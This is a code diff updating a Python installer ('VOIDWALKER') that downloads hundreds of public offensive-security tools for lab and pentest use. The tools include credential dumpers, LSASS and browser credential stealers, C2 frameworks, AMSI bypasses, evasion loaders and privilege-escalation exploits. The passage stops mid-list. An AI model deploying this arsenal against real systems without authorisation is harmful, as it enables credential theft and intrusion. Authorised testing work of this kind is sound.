@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-VOIDWALKER v3.9.2 - Elite Penetration Testing Arsenal Builder
-A colorful, animated terminal-based installation script for Ubuntu/Debian systems
-Features binary downloads, parallel installs, and cyberpunk aesthetics.
+VOIDWALKER v4.2.0 - Elite Penetration Testing Arsenal Builder
+Cross-platform installation script for Linux (apt) and macOS (brew).
+Features binary downloads, C# build system, parallel installs, and cyberpunk aesthetics.
 
 Designed for HTB Pro Labs and professional penetration testing engagements.
-Downloads 250+ security tools including Windows binaries, PowerShell scripts,
-C2 frameworks, and more.
+Downloads 350+ security tools including Windows, Linux & macOS binaries,
+PowerShell scripts, C2 frameworks, C# build system, UV/pipx Python tools, and more.
 """
 
 import argparse
@@ -32,7 +32,7 @@ from pathlib import Path
 from typing import Dict, List, Optional, Tuple
 from urllib.error import HTTPError, URLError
 
-__version__ = "3.9.2"
+__version__ = "4.2.0"
 
 class Colors:
     # Rosé Pine Dawn Color Palette
@@ -117,9 +117,13 @@ WORKSPACE_DIRS = [
     "tools/linux/enum",
     "tools/linux/privesc",
     "tools/linux/static",
+    "tools/linux/pivoting",
+    "tools/linux/scanning",
     "tools/pivoting/chisel",
     "tools/pivoting/ligolo-ng",
     "tools/pivoting/misc",
+    "tools/windows/pivoting",
+    "tools/windows/scanning",
     "tools/maldev/loaders",
     "tools/maldev/injection",
     "tools/maldev/evasion",
@@ -163,6 +167,10 @@ WORKSPACE_DIRS = [
     "loot",
     "scans",
     "reports/templates",
+    "tools/windows/compiled",
+    "tools/windows/ad",
+    "tools/ad",
+    "tools/build-src",
 ]
 
 TOOL_CATEGORIES = {
@@ -195,6 +203,36 @@ TOOL_CATEGORIES = {
             ("accesschk64", "file", "https://live.sysinternals.com/accesschk64.exe", "Access check utility"),
             ("PsExec64", "file", "https://live.sysinternals.com/PsExec64.exe", "Remote execution"),
             ("procdump64", "file", "https://live.sysinternals.com/procdump64.exe", "Process dump utility"),
+            # Additional AD / Post-Exploitation Tools
+            ("SharpChrome", "file", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpChrome.exe", "Chrome credential extraction"),
+            ("SharpDump", "file", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDump.exe", "Process minidump (LSASS)"),
+            ("SharpWMI", "file", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe", "WMI lateral movement"),
+            ("LockLess", "file", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/LockLess.exe", "Locked file access"),
+            ("SharpKatz", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpKatz.exe", "C# Mimikatz sekurlsa"),
+            ("BetterSafetyKatz", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/BetterSafetyKatz.exe", "Dynamic Mimikatz loader"),
+            ("ADFSDump", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADFSDump.exe", "ADFS config dumper"),
+            ("SharpNamedPipePTH", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpNamedPipePTH.exe", "PtH via named pipes"),
+            ("SharpSpray", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSpray.exe", "AD password sprayer"),
+            ("ThunderFox", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ThunderFox.exe", "Firefox/Thunderbird creds"),
+            ("SharpHandler", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpHandler.exe", "Token impersonation handler"),
+            ("ADCSPwn", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADCSPwn.exe", "ADCS ESC1 exploitation"),
+            ("SharpSQLPwn", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSQL4.exe", "SQL Server exploitation"),
+            # SharpCollection Nightly Roster (2026)
+            ("ADCollector", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADCollector.exe", "AD enumeration & data collector"),
+            ("ADSearch", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADSearch.exe", "AD LDAP query tool"),
+            ("AtYourService", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/AtYourService.exe", "Service enumeration"),
+            ("EDD", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/EDD.exe", "Enumerate Domain Data"),
+            ("ForgeCert", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ForgeCert.exe", "Certificate forgery"),
+            ("PassTheCert", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/PassTheCert.exe", "Certificate-based auth abuse"),
+            ("PurpleSharp", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/PurpleSharp.exe", "Adversary simulation"),
+            ("RunAs", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/RunAs.exe", "Run process as another user"),
+            ("SauronEye", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SauronEye.exe", "File share search tool"),
+            ("scout", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/scout.exe", "AD recon & graph builder"),
+            ("SearchOutlook", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SearchOutlook.exe", "Outlook email search"),
+            ("SharpAllowedToAct", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpAllowedToAct.exe", "RBCD exploitation"),
+            ("SharpSCCM", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSCCM.exe", "SCCM recon & abuse"),
+            ("SharpView", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpView.exe", "C# PowerView port"),
+            ("StandIn", "file", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/StandIn.exe", "AD post-compromise toolkit"),
         ],
         "repos": [
             ("GhostPack-Compiled", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git"),
@@ -239,6 +277,59 @@ TOOL_CATEGORIES = {
             ("krbrelayx", "https://github.com/dirkjanm/krbrelayx.git"),
             ("mitm6", "https://github.com/dirkjanm/mitm6.git"),
             ("RemotePotato0", "https://github.com/antonioCoco/RemotePotato0.git"),
+            # Source repos for C# building (see BUILD_TARGETS)
+            ("Rubeus-Source", "https://github.com/GhostPack/Rubeus.git"),
+            ("Seatbelt-Source", "https://github.com/GhostPack/Seatbelt.git"),
+            ("SharpUp-Source", "https://github.com/GhostPack/SharpUp.git"),
+            ("SharpDPAPI-Source", "https://github.com/GhostPack/SharpDPAPI.git"),
+            ("SharpSploit", "https://github.com/cobbr/SharpSploit.git"),
+            ("SharpKatz-Source", "https://github.com/b4rtik/SharpKatz.git"),
+            ("BetterSafetyKatz-Source", "https://github.com/Flangvik/BetterSafetyKatz.git"),
+            ("SharpImpersonation", "https://github.com/S3cur3Th1sSh1t/SharpImpersonation.git"),
+            ("SharpBlock", "https://github.com/CCob/SharpBlock.git"),
+            ("SharpPrinter", "https://github.com/rvrsh3ll/SharpPrinter.git"),
+            ("ADFSDump-Source", "https://github.com/mandiant/ADFSDump.git"),
+            ("ADCSPwn-Source", "https://github.com/bats3c/ADCSPwn.git"),
+            ("TokenStomp", "https://github.com/MartinIngworthy/TokenStomp.git"),
+            ("SharpScribbles", "https://github.com/V1V1/SharpScribbles.git"),
+            # C# Offensive / Post-Exploitation extras
+            ("SharpSploitConsole", "https://github.com/anthemtotheego/SharpSploitConsole.git"),
+            ("SharpCradle", "https://github.com/anthemtotheego/SharpCradle.git"),
+            ("InlineExecute-Assembly", "https://github.com/anthemtotheego/InlineExecute-Assembly.git"),
+            ("SharpAttack", "https://github.com/jnqpblc/SharpAttack.git"),
+            ("Elite", "https://github.com/cobbr/Elite.git"),
+            ("SharpGen", "https://github.com/cobbr/SharpGen.git"),
+            ("PSAmsi", "https://github.com/cobbr/PSAmsi.git"),
+            ("KyleEvers-SharpCollection", "https://github.com/KyleEvers/SharpCollection.git"),
+            # AD Recon / Exploitation extras
+            ("SharpZeroLogon", "https://github.com/buffaloverflow/SharpZeroLogon.git"),
+            ("TruffleSnout", "https://github.com/dsnezhkov/TruffleSnout.git"),
+            ("SharpSniper", "https://github.com/HunnicCyber/SharpSniper.git"),
+            ("PingCastle", "https://github.com/vletoux/pingcastle.git"),
+            ("linWinPwn", "https://github.com/lefayjey/linWinPwn.git"),
+            ("Misconfiguration-Manager", "https://github.com/subat0mik/Misconfiguration-Manager.git"),
+            ("sccmhunter", "https://github.com/garrettfoster13/sccmhunter.git"),
+            ("adidnsdump", "https://github.com/dirkjanm/adidnsdump.git"),
+            ("WMIOps", "https://github.com/FortyNorthSecurity/WMIOps.git"),
+            # Host Recon / Privilege Escalation extras
+            ("SharpExec", "https://github.com/anthemtotheego/SharpExec.git"),
+            ("SharpFiles", "https://github.com/fullmetalcache/SharpFiles.git"),
+            ("SharpSvc", "https://github.com/jnqpblc/SharpSvc.git"),
+            ("SharpTask", "https://github.com/jnqpblc/SharpTask.git"),
+            ("SweetPotato", "https://github.com/CCob/SweetPotato.git"),
+            ("SharpEDRChecker", "https://github.com/PwnDexter/SharpEDRChecker.git"),
+            # Credential / LSASS extras
+            ("SharpWifiGrabber", "https://github.com/r3nhat/SharpWifiGrabber.git"),
+            ("SharpLocker", "https://github.com/Pickfordmatt/SharpLocker.git"),
+            ("HandleKatz", "https://github.com/codewhitesec/HandleKatz.git"),
+            ("Lsass-Shtinkering", "https://github.com/deepinstinct/Lsass-Shtinkering.git"),
+            ("ThunderFox-Source", "https://github.com/V1V1/ThunderFox.git"),
+            # Chrome / Browser Data Extraction
+            ("ChromeKatz", "https://github.com/Meckazin/ChromeKatz.git"),
+            ("HackBrowserData", "https://github.com/moonD4rk/HackBrowserData.git"),
+            ("ChromeDumper", "https://github.com/nicehash/ChromeDumper.git"),
+            ("chrome-bypass", "https://github.com/nicehash/chrome-bypass.git"),
+            ("chrome_v20_decryption", "https://github.com/nicehash/chrome_v20_decryption.git"),
         ]
     },
     "PowerShell Scripts": {
@@ -253,10 +344,19 @@ TOOL_CATEGORIES = {
             ("Invoke-TheHash", "https://github.com/Kevin-Robertson/Invoke-TheHash.git"),
             ("PrivescCheck", "https://github.com/itm4n/PrivescCheck.git"),
             ("AMSI-Bypass-PS", "https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell.git"),
+            # Additional PowerShell AD modules
+            ("PowerView-Dev", "https://github.com/HarmJ0y/PowerView.git"),
+            ("Invoke-Mimikatz", "https://github.com/clymb3r/PowerShell.git"),
+            ("Get-GPPPassword", "https://github.com/PowerShellMafia/PowerSploit.git"),
+            ("Invoke-Portscan", "https://github.com/PowerShellMafia/PowerSploit.git"),
+            ("PowerSharpPack", "https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git"),
+            ("Invoke-Obfuscation", "https://github.com/danielbohannon/Invoke-Obfuscation.git"),
         ],
         "files": [
             ("jaws-enum.ps1", "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"),
             ("SharpHound.ps1", "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.ps1"),
+            ("PowerView.ps1", "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"),
+            ("Invoke-Kerberoast.ps1", "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"),
         ]
     },
     "Linux Tools": {
@@ -304,6 +404,8 @@ TOOL_CATEGORIES = {
             ("Merlin", "https://github.com/Ne0nd0g/merlin.git"),
             ("SharpC2", "https://github.com/rasta-mouse/SharpC2.git"),
             ("Hoaxshell", "https://github.com/t3l3machus/hoaxshell.git"),
+            ("Empire", "https://github.com/BC-SECURITY/Empire.git"),
+            ("Metasploit", "https://github.com/rapid7/metasploit-framework.git"),
         ]
     },
     "Maldev Tools": {
@@ -325,6 +427,37 @@ TOOL_CATEGORIES = {
             ("OffensiveRust", "https://github.com/trickster0/OffensiveRust.git"),
             ("OffensiveNim", "https://github.com/byt3bl33d3r/OffensiveNim.git"),
             ("UACME", "https://github.com/hfiref0x/UACME.git"),
+            # Loaders / Shellcode / Evasion
+            ("Freeze.rs", "https://github.com/optiv/Freeze.rs.git"),
+            ("NimPlant", "https://github.com/chvancooten/NimPlant.git"),
+            ("SilentMoonWalk", "https://github.com/klezVirus/SilentMoonWalk.git"),
+            ("Ekko", "https://github.com/Cracked5pider/Ekko.git"),
+            ("Cronos", "https://github.com/Idov31/Cronos.git"),
+            ("KrakenMask", "https://github.com/kleiton0x00/KrakenMask.git"),
+            ("AceLdr", "https://github.com/kleiton0x00/AceLdr.git"),
+            # Sleep Mask / Stack Spoof / Evasion
+            ("SleepyCrypt", "https://github.com/SolomonSklash/SleepyCrypt.git"),
+            ("GPUSleep", "https://github.com/lem0nSec/GPUSleep.git"),
+            ("CallStackMasker", "https://github.com/Cobalt-Strike/CallStackMasker.git"),
+            ("Draugr", "https://github.com/NtDallas/Draugr.git"),
+            ("Shelter", "https://github.com/Kudaes/Shelter.git"),
+            ("Pendulum", "https://github.com/GeorgePisaltu/pendulum.git"),
+            # Payload Hiding / Wrappers
+            ("Pixload", "https://github.com/chinarulezzz/pixload.git"),
+            ("Cloak", "https://github.com/EgeBalci/Cloak.git"),
+            ("SNOWCRASH", "https://github.com/redcode-labs/SNOWCRASH.git"),
+            ("WordSteal", "https://github.com/mdsecactivebreach/Farmer.git"),
+            # Maldev Academy Public Repos
+            ("HookingLsassForCredentials", "https://github.com/Maldev-Academy/HookingLsassForCredentials.git"),
+            ("LsassHijackingViaReg", "https://github.com/Maldev-Academy/LsassHijackingViaReg.git"),
+            ("GhostlyHollowingViaTamperedSyscalls", "https://github.com/Maldev-Academy/GhostlyHollowingViaTamperedSyscalls.git"),
+            ("ExecutePeFromPngViaLNK", "https://github.com/Maldev-Academy/ExecutePeFromPngViaLNK.git"),
+            ("EmbedPayloadInPng", "https://github.com/Maldev-Academy/EmbedPayloadInPng.git"),
+            ("DRMBinViaOrdinalImports", "https://github.com/Maldev-Academy/DRMBinViaOrdinalImports.git"),
+            ("RemoteTLSCallbackInjection", "https://github.com/Maldev-Academy/RemoteTLSCallbackInjection.git"),
+            ("MaldevAcademyLdr.1", "https://github.com/Maldev-Academy/MaldevAcademyLdr.1.git"),
+            ("EntropyReducer", "https://github.com/Maldev-Academy/EntropyReducer.git"),
+            ("HellHall", "https://github.com/Maldev-Academy/HellHall.git"),
         ]
     },
     "Web Tools": {
@@ -548,10 +681,46 @@ APT_TOOLS = [
     "iptables", "nftables", "ufw",
 ]
 
+# ── macOS Homebrew packages ─────────────────────────────────────────────────
+# Equivalent tools for macOS via `brew install` / `brew install --cask`
+BREW_TOOLS = [
+    # Reconnaissance & Scanning
+    "nmap", "masscan", "amass", "subfinder", "dnsrecon", "dnsenum",
+    "whois", "fping",
+    # Web Application Testing
+    "gobuster", "feroxbuster", "nikto", "whatweb",
+    "sqlmap", "curl", "wget", "httpie",
+    # Password Attacks
+    "hydra", "john-jumbo", "hashcat", "crunch", "cewl",
+    # Sniffing & Spoofing
+    "tcpdump", "bettercap",
+    # Post-Exploitation
+    "samba", "nbtscan", "openldap",
+    # Pivoting & Tunneling
+    "proxychains-ng", "socat", "ncat",
+    # Utilities
+    "rlwrap", "tmux", "screen", "vim", "jq", "yq",
+    "tree", "htop", "ncdu",
+    "radare2",
+    # Development & Build
+    "go", "rust", "python@3", "pipx", "ruby", "node", "npm",
+    "cmake", "make",
+    "git", "git-lfs", "p7zip", "unzip", "zip",
+    "openssl", "libffi", "libpcap",
+    # Networking
+    "openvpn", "wireguard-tools",
+]
+
+BREW_CASKS = [
+    "wireshark",
+    "burp-suite",
+    "bloodhound",
+    "ghidra",
+]
+
 PIPX_TOOLS = [
     # Active Directory & Windows
-    "impacket",
-    "certipy-ad",
+    # NOTE: impacket, certipy-ad, bloodyAD, netexec are installed via UV (see UV_TOOLS)
     "bloodhound",
     "bloodhound-python",
     "bloodhound-ce-python",
@@ -561,7 +730,6 @@ PIPX_TOOLS = [
     "adidnsdump",
     "ldeep",
     "pypykatz",
-    "bloodyAD",
     "pywerview",
     "dploot",
     "donpapi",
@@ -662,23 +830,592 @@ SPECIAL_TOOLS = {
         "dest": "/usr/local/bin/kerbrute",
         "chmod": True,
     },
-    "ligolo-proxy": {
-        "type": "archive",
-        "url": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz",
-        "dest": "/usr/local/bin/ligolo-proxy",
-        "chmod": True,
-    },
-    "ligolo-agent": {
-        "type": "archive",
-        "url": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz",
-        "dest": "/usr/local/bin/ligolo-agent",
-        "chmod": True,
-    },
+}
+
+# Cross-platform tools — download Windows, Linux AND macOS binaries
+# These are binaries you'll want to transfer to compromised hosts
+# or run on your attack box regardless of OS.
+CROSS_PLATFORM_TOOLS = {
     "chisel": {
-        "type": "archive",
-        "url": "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz",
-        "dest": "/usr/local/bin/chisel",
-        "chmod": True,
+        "description": "TCP/UDP tunnelling over HTTP",
+        "windows": [
+            ("chisel_windows_amd64.exe", "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz"),
+        ],
+        "linux": [
+            ("chisel_linux_amd64", "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"),
+        ],
+        "darwin": [
+            ("chisel_darwin_amd64", "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_darwin_amd64.gz"),
+            ("chisel_darwin_arm64", "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_darwin_arm64.gz"),
+        ],
+        "dest_dir": "tools/pivoting/chisel",
+    },
+    "ligolo-ng": {
+        "description": "Tunnelling/pivoting tool using TUN interfaces",
+        "windows": [
+            ("ligolo-ng_agent_windows_amd64.zip", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip"),
+        ],
+        "linux": [
+            ("ligolo-ng_proxy_linux_amd64.tar.gz", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz"),
+            ("ligolo-ng_agent_linux_amd64.tar.gz", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz"),
+        ],
+        "darwin": [
+            ("ligolo-ng_proxy_darwin_amd64.tar.gz", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_darwin_amd64.tar.gz"),
+            ("ligolo-ng_proxy_darwin_arm64.tar.gz", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_darwin_arm64.tar.gz"),
+            ("ligolo-ng_agent_darwin_amd64.tar.gz", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_darwin_amd64.tar.gz"),
+            ("ligolo-ng_agent_darwin_arm64.tar.gz", "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_darwin_arm64.tar.gz"),
+        ],
+        "dest_dir": "tools/pivoting/ligolo-ng",
+    },
+    "fscan": {
+        "description": "Internal network scanner (shadow1ng)",
+        "windows": [
+            ("fscan64.exe", "https://github.com/shadow1ng/fscan/releases/latest/download/fscan64.exe"),
+            ("fscan32.exe", "https://github.com/shadow1ng/fscan/releases/latest/download/fscan32.exe"),
+        ],
+        "linux": [
+            ("fscan_amd64", "https://github.com/shadow1ng/fscan/releases/latest/download/fscan"),
+            ("fscan_386", "https://github.com/shadow1ng/fscan/releases/latest/download/fscan32"),
+        ],
+        "dest_dir_win": "tools/windows/scanning",
+        "dest_dir_linux": "tools/linux/scanning",
+    },
+    "kerbrute": {
+        "description": "Kerberos brute-force / user enumeration",
+        "windows": [
+            ("kerbrute_windows_amd64.exe", "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe"),
+        ],
+        "linux": [
+            ("kerbrute_linux_amd64", "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"),
+        ],
+        "darwin": [
+            ("kerbrute_darwin_amd64", "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_darwin_amd64"),
+        ],
+        "dest_dir": "tools/ad/kerbrute",
+    },
+    "sliver": {
+        "description": "Sliver C2 — adversary emulation framework",
+        "linux": [
+            ("sliver-server_linux", "https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux"),
+            ("sliver-client_linux", "https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux"),
+        ],
+        "darwin": [
+            ("sliver-client_macos", "https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_macos"),
+            ("sliver-client_macos-arm64", "https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_macos-arm64"),
+        ],
+        "windows": [
+            ("sliver-client_windows.exe", "https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe"),
+        ],
+        "dest_dir": "tools/c2/sliver",
+    },
+    "pspy": {
+        "description": "Linux process snooper (unprivileged)",
+        "linux": [
+            ("pspy64", "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"),
+            ("pspy32", "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32"),
+            ("pspy64s", "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s"),
+            ("pspy32s", "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s"),
+        ],
+        "dest_dir": "tools/linux/enum",
+    },
+    "winpeas": {
+        "description": "Windows privilege escalation scanner",
+        "windows": [
+            ("winPEASx64.exe", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"),
+            ("winPEASx86.exe", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe"),
+            ("winPEAS.bat", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat"),
+            ("winPEASany.exe", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"),
+        ],
+        "dest_dir": "tools/windows/privesc",
+    },
+    "linpeas": {
+        "description": "Linux privilege escalation scanner",
+        "linux": [
+            ("linpeas.sh", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"),
+            ("linpeas_linux_amd64", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64"),
+            ("linpeas_linux_386", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_386"),
+        ],
+        "dest_dir": "tools/linux/privesc",
+    },
+    "stowaway": {
+        "description": "Multi-hop proxy tool for pentesters",
+        "windows": [
+            ("windows_x64_admin.exe", "https://github.com/ph4ntonn/Stowaway/releases/latest/download/windows_x64_admin.exe"),
+            ("windows_x64_agent.exe", "https://github.com/ph4ntonn/Stowaway/releases/latest/download/windows_x64_agent.exe"),
+        ],
+        "linux": [
+            ("linux_x64_admin", "https://github.com/ph4ntonn/Stowaway/releases/latest/download/linux_x64_admin"),
+            ("linux_x64_agent", "https://github.com/ph4ntonn/Stowaway/releases/latest/download/linux_x64_agent"),
+        ],
+        "darwin": [
+            ("macos_admin", "https://github.com/ph4ntonn/Stowaway/releases/latest/download/macos_admin"),
+            ("macos_agent", "https://github.com/ph4ntonn/Stowaway/releases/latest/download/macos_agent"),
+        ],
+        "dest_dir": "tools/pivoting/stowaway",
+    },
+    "frp": {
+        "description": "Fast reverse proxy — expose local servers",
+        "windows": [
+            ("frp_windows_amd64.zip", "https://github.com/fatedier/frp/releases/latest/download/frp_0.61.1_windows_amd64.zip"),
+        ],
+        "linux": [
+            ("frp_linux_amd64.tar.gz", "https://github.com/fatedier/frp/releases/latest/download/frp_0.61.1_linux_amd64.tar.gz"),
+        ],
+        "darwin": [
+            ("frp_darwin_amd64.tar.gz", "https://github.com/fatedier/frp/releases/latest/download/frp_0.61.1_darwin_amd64.tar.gz"),
+            ("frp_darwin_arm64.tar.gz", "https://github.com/fatedier/frp/releases/latest/download/frp_0.61.1_darwin_arm64.tar.gz"),
+        ],
+        "dest_dir": "tools/pivoting/frp",
+    },
+    "gost": {
+        "description": "GO Simple Tunnel — encrypted proxy chains",
+        "windows": [
+            ("gost_windows_amd64.zip", "https://github.com/ginuerzh/gost/releases/latest/download/gost-windows-amd64-2.12.0.zip"),
+        ],
+        "linux": [
+            ("gost_linux_amd64.gz", "https://github.com/ginuerzh/gost/releases/latest/download/gost-linux-amd64-2.12.0.gz"),
+        ],
+        "darwin": [
+            ("gost_darwin_amd64.gz", "https://github.com/ginuerzh/gost/releases/latest/download/gost-darwin-amd64-2.12.0.gz"),
+        ],
+        "dest_dir": "tools/pivoting/gost",
+    },
+    "netcat-static": {
+        "description": "Static netcat binaries for file transfer",
+        "windows": [
+            ("nc64.exe", "https://github.com/int0x33/nc.exe/raw/master/nc64.exe"),
+            ("nc.exe", "https://github.com/int0x33/nc.exe/raw/master/nc.exe"),
+        ],
+        "linux": [
+            ("ncat_static", "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat"),
+        ],
+        "dest_dir": "tools/pivoting/netcat",
+    },
+    "socat-static": {
+        "description": "Static socat binary for Linux targets",
+        "linux": [
+            ("socat_static", "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"),
+        ],
+        "dest_dir": "tools/pivoting/socat",
+    },
+    "mimikatz": {
+        "description": "Windows credential dumping — Mimikatz trunk",
+        "windows": [
+            ("mimikatz_trunk.zip", "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"),
+        ],
+        "dest_dir": "tools/windows/creds",
+    },
+    "lazagne": {
+        "description": "Multi-platform credential recovery",
+        "windows": [
+            ("LaZagne.exe", "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe"),
+        ],
+        "linux": [
+            ("lazagne_linux", "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.deb"),
+        ],
+        "dest_dir": "tools/creds/lazagne",
+    },
+    "godpotato": {
+        "description": "Potato privilege escalation (.NET)",
+        "windows": [
+            ("GodPotato-NET2.exe", "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe"),
+            ("GodPotato-NET4.exe", "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe"),
+            ("GodPotato-NET35.exe", "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe"),
+        ],
+        "dest_dir": "tools/windows/privesc",
+    },
+    "printspoofer": {
+        "description": "Pipe privilege escalation",
+        "windows": [
+            ("PrintSpoofer64.exe", "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe"),
+            ("PrintSpoofer32.exe", "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer32.exe"),
+        ],
+        "dest_dir": "tools/windows/privesc",
+    },
+    "rustscan": {
+        "description": "Fast port scanner written in Rust",
+        "linux": [
+            ("rustscan_amd64.deb", "https://github.com/RustScan/RustScan/releases/latest/download/rustscan_2.3.0_amd64.deb"),
+        ],
+        "darwin": [
+            ("rustscan_macos", "https://github.com/RustScan/RustScan/releases/latest/download/rustscan_2.3.0_aarch64-apple-darwin"),
+        ],
+        "dest_dir": "tools/scanning/rustscan",
+    },
+    "bloodhound-collectors": {
+        "description": "BloodHound data collection — SharpHound + AzureHound",
+        "windows": [
+            ("SharpHound.exe", "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe"),
+            ("SharpHound.ps1", "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.ps1"),
+        ],
+        "dest_dir": "tools/ad/bloodhound",
+    },
+    "rubeus": {
+        "description": "Kerberos abuse toolkit (C#)",
+        "windows": [
+            ("Rubeus.exe", "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"),
+        ],
+        "dest_dir": "tools/windows/kerberos",
+    },
+    "juicypotatong": {
+        "description": "JuicyPotatoNG — next-gen potato priv-esc",
+        "windows": [
+            ("JuicyPotatoNG.zip", "https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip"),
+        ],
+        "dest_dir": "tools/windows/privesc",
+    },
+    "runascs": {
+        "description": "RunAs alternative with credentials",
+        "windows": [
+            ("RunasCs.zip", "https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip"),
+        ],
+        "dest_dir": "tools/windows/misc",
+    },
+    "nanodump": {
+        "description": "Stealthy LSASS process dumper",
+        "windows": [
+            ("nanodump.x64.exe", "https://github.com/fortra/nanodump/releases/latest/download/nanodump.x64.exe"),
+        ],
+        "dest_dir": "tools/windows/creds",
+    },
+    "snaffler": {
+        "description": "Credential hunting across file shares",
+        "windows": [
+            ("Snaffler.exe", "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe"),
+        ],
+        "dest_dir": "tools/windows/enum",
+    },
+    "inveigh": {
+        "description": "LLMNR/NBNS/mDNS poisoning tool",
+        "windows": [
